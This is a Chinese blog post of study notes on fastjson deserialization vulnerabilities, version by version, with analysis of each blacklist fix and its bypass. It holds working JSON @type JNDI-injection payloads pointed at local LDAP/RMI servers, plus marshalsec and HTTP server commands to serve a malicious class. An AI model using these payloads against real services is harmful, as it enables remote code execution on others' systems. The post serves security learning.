@@ -1,0 +1,493 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="https://i.loli.net/2020/04/25/3jOZRPIxi5gLFfX.jpg">
+  <link rel="icon" type="image/png" sizes="32x32" href="https://i.loli.net/2020/04/25/3jOZRPIxi5gLFfX.jpg">
+  <link rel="icon" type="image/png" sizes="16x16" href="https://i.loli.net/2020/04/25/3jOZRPIxi5gLFfX.jpg">
+  <link rel="mask-icon" href="https://i.loli.net/2020/04/25/3jOZRPIxi5gLFfX.jpg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Monda:300,300italic,400,400italic,700,700italic|Roboto Slab:300,300italic,400,400italic,700,700italic|Loboster Two:300,300italic,400,400italic,700,700italic|Noto Serif SC:300,300italic,400,400italic,700,700italic|PT Mono:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"yoursite.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","width":220,"display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="前言  了解了 java 基本的序列化机制 和 简单的反序列化攻击方式后 开始学习一下影响广泛的 fastjson 系列反序列化漏洞吧">
+<meta property="og:type" content="article">
+<meta property="og:title" content="java web入门 fastJson 系列漏洞学习">
+<meta property="og:url" content="http://yoursite.com/2020/09/15/java%20web%E5%85%A5%E9%97%A8%20fastJson%20%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/index.html">
+<meta property="og:site_name" content="enivS0rt&#39;s Blog">
+<meta property="og:description" content="前言  了解了 java 基本的序列化机制 和 简单的反序列化攻击方式后 开始学习一下影响广泛的 fastjson 系列反序列化漏洞吧">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://yoursite.com/2020/09/15/java%20web%E5%85%A5%E9%97%A8%20fastJson%20%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20200921204113049.png">
+<meta property="og:image" content="http://yoursite.com/2020/09/15/java%20web%E5%85%A5%E9%97%A8%20fastJson%20%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20200921204027666.png">
+<meta property="og:image" content="http://yoursite.com/2020/09/15/java%20web%E5%85%A5%E9%97%A8%20fastJson%20%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20200922190826356.png">
+<meta property="article:published_time" content="2020-09-15T07:41:42.195Z">
+<meta property="article:modified_time" content="2020-09-23T12:02:32.323Z">
+<meta property="article:author" content="enivS0rt">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yoursite.com/2020/09/15/java%20web%E5%85%A5%E9%97%A8%20fastJson%20%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20200921204113049.png">
+
+<link rel="canonical" href="http://yoursite.com/2020/09/15/java%20web%E5%85%A5%E9%97%A8%20fastJson%20%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>java web入门 fastJson 系列漏洞学习 | enivS0rt's Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">enivS0rt's Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/09/15/java%20web%E5%85%A5%E9%97%A8%20fastJson%20%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://i.loli.net/2020/04/25/3jOZRPIxi5gLFfX.jpg">
+      <meta itemprop="name" content="enivS0rt">
+      <meta itemprop="description" content="the things I do for love">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="enivS0rt's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          java web入门 fastJson 系列漏洞学习
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2020-09-15 15:41:42" itemprop="dateCreated datePublished" datetime="2020-09-15T15:41:42+08:00">2020-09-15</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2020-09-23 20:02:32" itemprop="dateModified" datetime="2020-09-23T20:02:32+08:00">2020-09-23</time>
+              </span>
+
+          
+            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">Views: </span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h5 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h5><p>  了解了 java 基本的序列化机制 和 简单的反序列化攻击方式后 开始学习一下影响广泛的 fastjson 系列反序列化漏洞吧</p>
+<a id="more"></a>
+
+<h5 id="fastjson"><a href="#fastjson" class="headerlink" title="fastjson"></a>fastjson</h5><p>与 jdk 提供的序列化机制 即类与字节码的互相转化不同 fastjson 提供类和 json 字符串的互相转化 且有以下几个特点:</p>
+<ul>
+<li>将 json 字符串反序列化为类时 会调用 setter 方法</li>
+<li>类的没有 setter 方法的公有属性 能被正常赋值</li>
+<li>类的没有 setter 方法的私有属性 需要开启 Feature.SupportNonPublicField 才可正常赋值</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 序列化</span></span><br><span class="line">JSON.toJSONString();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 反序列化</span></span><br><span class="line">JSON.parseObject();</span><br></pre></td></tr></table></figure>
+
+<h6 id="v1-2-23"><a href="#v1-2-23" class="headerlink" title="v1.2.23"></a>v1.2.23</h6><p>漏洞成因在于 如果被反序列化的 json 字符串带有 @type 字段 则其会被反序列化为指定的类 这就成为了 POP 链的起点</p>
+<p>利用 JdbcRowSetImpl 类通过 ldap 或 rmi 服务加载恶意类</p>
+<ul>
+<li>RMI: <code>jdk6u123</code> <code>jdk7u122</code> <code>jdk8u113</code> 之前</li>
+<li>LDAP: <code>jdk6u211</code> <code>jdk7u201</code> <code>jdk8u191</code> <code>jdk 11.0.1</code> 之前</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String payload = <span class="string">"&#123;\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://localhost:4444/Evil\",\"autoCommit\":true&#125;"</span>;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:2333/\<span class="comment">#Evil 4444</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer 2333</span><br></pre></td></tr></table></figure>
+
+<h6 id="v1-2-41"><a href="#v1-2-41" class="headerlink" title="v1.2.41"></a>v1.2.41</h6><p>网上的分析已经很多了 checkautotype 函数中增添了一个黑名单 如果传入的类名以黑名单中的类名开头则抛出一个异常</p>
+<img src="/2020/09/15/java%20web%E5%85%A5%E9%97%A8%20fastJson%20%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20200921204113049.png" alt="image-20200921204113049" style="zoom:80%;">
+
+<img src="/2020/09/15/java%20web%E5%85%A5%E9%97%A8%20fastJson%20%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20200921204027666.png" alt="image-20200921204027666" style="zoom:80%;">
+
+<p>而在之后 TypeUtils.loadClass 函数中对以 <code>[</code> 开头的类名和以 <code>L</code> 开头 <code>;</code> 结尾的类名进行了处理 方式是将以上字符替换为空字符 这就造成了对黑名单的绕过</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 要求开启 autotype</span></span><br><span class="line">ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">String payload = <span class="string">"&#123;\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;\",\"dataSourceName\":\"ldap://localhost:4444/Evil\",\"autoCommit\":true]&#125;"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 这个 payload 需要跟进去调试一下 以 [ 开头的类会被作为数组实例化 至于 json 字符串参数为什么是这个格式 调了一下也没有很搞明白(x</span></span><br><span class="line">String payload = <span class="string">"&#123;\"@type\":\"[com.sun.rowset.JdbcRowSetImpl\"[&#123;\"dataSourceName\":\"ldap://localhost:4444/Evil\",\"autoCommit\":true&#125;]&#125;"</span>;</span><br></pre></td></tr></table></figure>
+
+<h6 id="v1-2-42"><a href="#v1-2-42" class="headerlink" title="v1.2.42"></a>v1.2.42</h6><p>这个在 checkautotype 之前先对类名进行了一次过滤 若 <code>L</code> 开头 <code>;</code> 结尾则将其去除 所以可以双写绕过</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 要求开启 autotype</span></span><br><span class="line">ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">String payload = <span class="string">"&#123;\"@type\":\"LLcom.sun.rowset.JdbcRowSetImpl;;\",\"dataSourceName\":\"ldap://localhost:4444/Evil\",\"autoCommit\":true]&#125;"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 这个还能用(orz</span></span><br><span class="line">String payload = <span class="string">"&#123;\"@type\":\"[com.sun.rowset.JdbcRowSetImpl\"[&#123;\"dataSourceName\":\"ldap://localhost:4444/Evil\",\"autoCommit\":true&#125;]&#125;"</span>;</span><br></pre></td></tr></table></figure>
+
+<h6 id="v1-2-43"><a href="#v1-2-43" class="headerlink" title="v1.2.43"></a>v1.2.43</h6><p>如果类名开头为 <code>LL</code> 则直接抛出异常</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 要求开启 autotype</span></span><br><span class="line">ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 这个还能用(orz</span></span><br><span class="line">String payload = <span class="string">"&#123;\"@type\":\"[com.sun.rowset.JdbcRowSetImpl\"[&#123;\"dataSourceName\":\"ldap://localhost:4444/Evil\",\"autoCommit\":true&#125;]&#125;"</span>;</span><br></pre></td></tr></table></figure>
+
+<h6 id="v1-2-45"><a href="#v1-2-45" class="headerlink" title="v1.2.45"></a>v1.2.45</h6><p>通过第三方包的类进行 rce 完成对黑名单的绕过</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 要求开启 autotype</span></span><br><span class="line">ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 需要 mybatis 依赖 或者 ibatis-core</span></span><br><span class="line">String payload = <span class="string">"&#123;\"@type\":\"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\",\"properties\":&#123;\"data_source\":\"ldap://127.0.0.1:4444/Evil\"&#125;&#125;"</span></span><br></pre></td></tr></table></figure>
+
+<h6 id="v1-2-47"><a href="#v1-2-47" class="headerlink" title="v1.2.47"></a>v1.2.47</h6><p>通杀 payload 无论 autotype 开启与否</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String payload = <span class="string">"&#123;\"a\":&#123;\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"&#125;,\"b\":&#123;\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://127.0.0.1:4444/Evil\",\"autoCommit\":true&#125;&#125;&#125;"</span>;</span><br></pre></td></tr></table></figure>
+
+<p>关键在于 一个类名若是没有通过黑名单的校验 则会尝试从一个 mappings 中获取它 若其存在则依旧可以被反序列化 而这个 mappings 可以利用 loadClass 函数进行污染 注入恶意的类名</p>
+<img src="/2020/09/15/java%20web%E5%85%A5%E9%97%A8%20fastJson%20%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20200922190826356.png" alt="image-20200922190826356" style="zoom:80%;">
+
+<p>洞的修复方式为在 loadClass 的三个分支中均加入 cache 判断 且默认 cache 为 false </p>
+<p>在这个版本之后 利用条件就在于当 autotype 开启时 利用不在黑名单里的类进行 rce 修复方式也就是在黑名单中不断添加新的类</p>
+<h6 id="v1-2-60"><a href="#v1-2-60" class="headerlink" title="v1.2.60"></a>v1.2.60</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 要求开启 autotype</span></span><br><span class="line">ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// commons-configuration 包</span></span><br><span class="line">String payload = <span class="string">"&#123;\"@type\":\"org.apache.commons.configuration.JNDIConfiguration\",\"prefix\":\"ldap://127.0.0.1:4444/Evil\"&#125;"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// oracle-jdbc </span></span><br><span class="line">String payload = <span class="string">"&#123;\"@type\":\"oracle.jdbc.connector.OracleManagedConnectionFactory\",\"xaDataSourceName\":\"rmi://127.0.0.1:4444/Evil\"&#125;"</span>;</span><br></pre></td></tr></table></figure>
+
+<h6 id="v1-2-62"><a href="#v1-2-62" class="headerlink" title="v1.2.62"></a>v1.2.62</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 要求开启 autotype</span></span><br><span class="line">ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">String payload = <span class="string">"&#123;\"@type\":\"org.apache.xbean.propertyeditor.JndiConverter\",\"AsText\":\"rmi://127.0.0.1:4444/Evil\"&#125;\""</span>;</span><br></pre></td></tr></table></figure>
+
+<h6 id="v1-2-66"><a href="#v1-2-66" class="headerlink" title="v1.2.66"></a>v1.2.66</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 要求开启 autotype</span></span><br><span class="line">ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">String payload = <span class="string">"&#123;\"@type\":\"org.apache.shiro.jndi.JndiObjectFactory\",\"resourceName\":\"ldap://127.0.0.1:4444/Evil\"&#125;"</span>;</span><br><span class="line"></span><br><span class="line">String payload = <span class="string">"&#123;\"@type\":\"br.com.anteros.dbcp.AnterosDBCPConfig\",\"metricRegistry\":\"ldap://127.0.0.1:4444/Evil\"&#125;"</span>;</span><br><span class="line"></span><br><span class="line">String payload = <span class="string">"&#123;\"@type\":\"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup\",\"jndiNames\":\"ldap://127.0.0.1:4444/Evil\"&#125;"</span>;</span><br><span class="line"></span><br><span class="line">String payload = <span class="string">"&#123;\"@type\":\"com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig\",\"properties\": &#123;\"@type\":\"java.util.Properties\",\"UserTransaction\":\"ldap://127.0.0.1:4444/Evil\"&#125;&#125;"</span>;</span><br></pre></td></tr></table></figure>
+
+<h6 id="v1-2-68"><a href="#v1-2-68" class="headerlink" title="v1.2.68"></a>v1.2.68</h6><p>不同于单纯的黑名单绕过的新的 bypass 的思路</p>
+<ul>
+<li><p>存在 autoTypeCheckHadnlers 的 通过其进行检测</p>
+</li>
+<li><p>既不在黑名单也不在白名单的类 满足以下情况可以被反序列化</p>
+<ul>
+<li><p>存在于 mappings 中的类 也就是 v1.2.47 绕过的方式</p>
+</li>
+<li><p>使用了 jsontype 注解的类</p>
+</li>
+<li><p>其存在 expectclass 且 expectclass 不在黑名单当中</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">expectClass != Object<span class="class">.<span class="keyword">class</span> &amp;&amp; <span class="title">expectClass</span> !</span>= Serializable<span class="class">.<span class="keyword">class</span> &amp;&amp; <span class="title">expectClass</span> !</span>= Cloneable<span class="class">.<span class="keyword">class</span> &amp;&amp; <span class="title">expectClass</span> !</span>= Closeable<span class="class">.<span class="keyword">class</span> &amp;&amp; <span class="title">expectClass</span> !</span>= EventListener<span class="class">.<span class="keyword">class</span> &amp;&amp; <span class="title">expectClass</span> !</span>= Iterable<span class="class">.<span class="keyword">class</span> &amp;&amp; <span class="title">expectClass</span> !</span>= Collection<span class="class">.<span class="keyword">class</span></span></span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+<li><p>最终实例化的类在当前版本 checkAutotype 加入了对其父类和接口的黑名单</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(ClassLoader<span class="class">.<span class="keyword">class</span>.<span class="title">isAssignableFrom</span>(<span class="title">clazz</span>) || <span class="title">DataSource</span>.<span class="title">class</span>.<span class="title">isAssignableFrom</span>(<span class="title">clazz</span>) || <span class="title">RowSet</span>.<span class="title">class</span>.<span class="title">isAssignableFrom</span>(<span class="title">clazz</span>))</span></span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<p>所以当指定了 expectclass 时 可以反序列化一个既不在黑名单也不在白名单的类 这个类继承于👇</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Throwable<span class="class">.<span class="keyword">class</span></span>;</span><br><span class="line">AutoCloseable<span class="class">.<span class="keyword">class</span></span>;</span><br></pre></td></tr></table></figure>
+
+<p>而反序列化类后会调用 setter 和 getter 方法 而 OutputStream 类是实现了 Autocloseable 接口的 所以我们可以反序列化出一个 OutputStream 类来 并寻找到存在 setter 方法或者构造函数往 OutputStream 中写数据的类 就可以打出一个文件写 具体可以看 <a 12 2020 href https: rmb122.com 06 fastjson-1-2-68-%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e-gadgets-%e6%8c%96%e6%8e%98%e7%ac%94%e8%ae%b0 "">这位师傅的文章</a></p>
+<h5 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h5><p>  这篇文章本来上周就应该弄好的 但是因为某大赛的原因拖了几天 关于 fastjson 反序列化的漏洞网上的分析很多 我也只是记录自己学习的笔记而已 有什么谬误的地方还请师傅们多包涵</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/09/14/java%20web%E5%85%A5%E9%97%A8%20ysoserial%20%E5%AD%A6%E4%B9%A0%20part%20%E2%85%A1%20/" rel="prev" title="java web入门 ysoserial 学习 part Ⅱ ">
+      <i class="fa fa-chevron-left"></i> java web入门 ysoserial 学习 part Ⅱ 
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-5"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#fastjson"><span class="nav-number">2.</span> <span class="nav-text">fastjson</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#v1-2-23"><span class="nav-number">2.1.</span> <span class="nav-text">v1.2.23</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#v1-2-41"><span class="nav-number">2.2.</span> <span class="nav-text">v1.2.41</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#v1-2-42"><span class="nav-number">2.3.</span> <span class="nav-text">v1.2.42</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#v1-2-43"><span class="nav-number">2.4.</span> <span class="nav-text">v1.2.43</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#v1-2-45"><span class="nav-number">2.5.</span> <span class="nav-text">v1.2.45</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#v1-2-47"><span class="nav-number">2.6.</span> <span class="nav-text">v1.2.47</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#v1-2-60"><span class="nav-number">2.7.</span> <span class="nav-text">v1.2.60</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#v1-2-62"><span class="nav-number">2.8.</span> <span class="nav-text">v1.2.62</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#v1-2-66"><span class="nav-number">2.9.</span> <span class="nav-text">v1.2.66</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#v1-2-68"><span class="nav-number">2.10.</span> <span class="nav-text">v1.2.68</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#后记"><span class="nav-number">3.</span> <span class="nav-text">后记</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="enivS0rt"
+      src="https://i.loli.net/2020/04/25/3jOZRPIxi5gLFfX.jpg">
+  <p class="site-author-name" itemprop="name">enivS0rt</p>
+  <div class="site-description" itemprop="description">the things I do for love</div>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">enivS0rt</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a>
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="Total Visitors">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="Total Views">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
